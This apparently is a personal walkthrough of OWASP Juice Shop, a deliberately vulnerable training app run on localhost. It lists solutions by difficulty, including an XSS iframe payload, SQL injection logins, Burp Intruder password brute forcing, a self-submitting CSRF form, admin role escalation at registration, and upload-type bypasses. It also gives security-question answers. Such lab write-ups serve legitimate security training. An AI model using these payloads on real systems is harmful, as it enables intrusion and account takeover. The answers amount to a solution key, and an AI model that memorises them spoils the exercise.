# OWASP Juice Shop<br>
## 1 STAR
### Score Board<br>
Firefox > Debugger > Search score > found: /score-board<br><br>
http://localhost:3000/#/score-board<br>

### Bully Chatbot<br>
Menu > Support Chat > Keep spamming coupon <br><br>

### DOM XSS<br>
search bar > <iframe src="javascript:alert(`xss`)"><br><br>

### Bonus Payload<br>
Search bar <br>
```
<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>
```
### Confidential Document<br>
http://localhost:3000/ftp > acquisitions.md<br><br>

### Error Handling<br>
Account Login > put ' in email and password fields<br><br>

### Exposed Metrics<br>
http://localhost:3000/metrics<br><br>

### Outdated Allowlist<br>
gospider -v -s http://127.0.0.1:3000/ -o gospider_output<br>
cd gospider_output
cat 127_0_0_1 | grep code-200<br><br>

### Missing Encoding<br>
change # to %23<br>
http://localhost:3000/assets/public/images/uploads/%F0%9F%98%BC-%23zatschi-%23whoneedsfourlegs-1572600969477.jpg<br><br>

### Zero Stars<br>
http://localhost:3000/#/contact<br>
burp proxy > repeater > rating:0<br><br>

### Repetitive Registration<br>
http://localhost:3000/#/register<br>
burp proxy > repeater > passwordRepeat:""<br><br>

## 2 STAR
### Login Admin<br>
http://localhost:3000/#/login<br>
email:admin' or true--<br>
password:'<br><br>

### Admin Section<br>
http://localhost:3000/#/administration<br><br>

### Five-Star Feedback<br>
http://localhost:3000/#/administration<br>
delete button<br>

### Empty User Registration<br>
http://localhost:3000/#/login<br>
burp proxy > repeater > email:"",password:"",passwordRepeat:""<br><br>

### Empty User Registration<br>
email:mc.safesearch@juice-sh.op<br>
password:Mr. N00dles<br>

### Meta Geo Stalking<br>
http://localhost:3000/#/forgot-password<br>
exiftool favorite-hiking-place.png <br>
36°57’31.38″ N 84°20’53.58″ W <br>
burp suite > repeater<br>
email: john@juice-sh.op<br>
secret:Daniel Boone National Forest<br>

### Weird Crypto
hash analyzer > 4b2e6b2618920cb1713bb801cd05401e<br>
http://localhost:3000/#/contact <br>
Comment: md5 > submit <br>

### Visual Geo Stalking
http://localhost:3000/#/forgot-password<br>
http://localhost:3000/assets/public/images/uploads/IMG_4253.jpg<br>
email: emma@juice-sh.op<br>
secret: ITsec<br>

### View Basket
http://localhost:3000/#/basket<br>
burp suite > repeater<br>
GET /rest/basket/X HTTP/1.1 <br>

### Security Policy
localhost:3000/.well-known/security.txt<br>

### Deprecated Interface 
http://localhost:3000/#/complain <br>
sudo apt install npm<br>
sudo npm -g install js-beautify<br>
js-beautify main.js > main1.js<br>
grep pdf main1.js<br>
```
allowedMimeType: ["application/pdf", "application/xml", "text/xml", "application/zip", "application/x-zip-compressed", "multipart/x-zip"],["ng2FileSelect", "", "id", "file", "type", "file", "accept", ".pdf,.zip", "aria-label", "Input area for uploading a single invoice PDF or XML B2B order file or a ZIP archive containing multiple invoices or orders\x3c!----\x3e", 2, "margin-left", "10px", 3, "uploader"]
rename .xml file extension to .zip or .pdf > uoload and submit
burp suite > repeater > remove .zip to .xml extension
Content-Disposition: form-data; name="file"; filename="legal.xml.zip"
```
### Login Admin
http://localhost:3000/#/login<br>
email:admin@juice-sh.op<br>
burp suite > intruder > positions: password > attack type: sniper<br>
payloads > usr/share/wordlist/fern-wifi/common.txt <br>

## 3 STAR
### Upload type
http://localhost:3000/#/complain <br>
rename .txt file extension to .zip or .pdf > uoload and submit<br>
burp suite > repeater > remove .zip to .txt extension<br>
Content-Disposition: form-data; name="file"; filename="legal.txt.zip"<br>

### Admin Registration
http://localhost:3000/#/register<br>
burp suite > proxy <br>
Post response > role:"customer" <br>
Post request > "role":"admin" <br>

### Bjoern's Favorite Pet 
http://localhost:3000/#/forgot-password<br>
email:bjoern@owasp.org <br>
secret: Zaya<br>

### CAPTCHA Bypass 
http://localhost:3000/#/contact <br>
burp suite > proxy > repeater <br>
send x10 <br>

### CSRF
download firefox 96.0 <br>
http://localhost:3000/profile > login into account <br>
http://htmledit.squarefree.com/ <br>
submit form: <br>
```
<form action="http://localhost:3000/profile" method="POST">
  <input name="username" value="CSRF"/>
  <input type="submit"/>
</form>
<script>document.forms[0].submit();</script>
```

### Database schema

### Upload size

### Reset Jim's Password 
http://localhost:3000/#/forgot-password<br>
email:jim@juice-sh.op<br>
secret: Samuel<br>

###  Forged Review 
add review for item<br>
burp suite > proxy<br>
"author":"emma@juice-sh.op"<br>

### Login Bender
http://localhost:3000/#/login<br>
email: bender@juice-sh.op'--<br>
password: '<br>































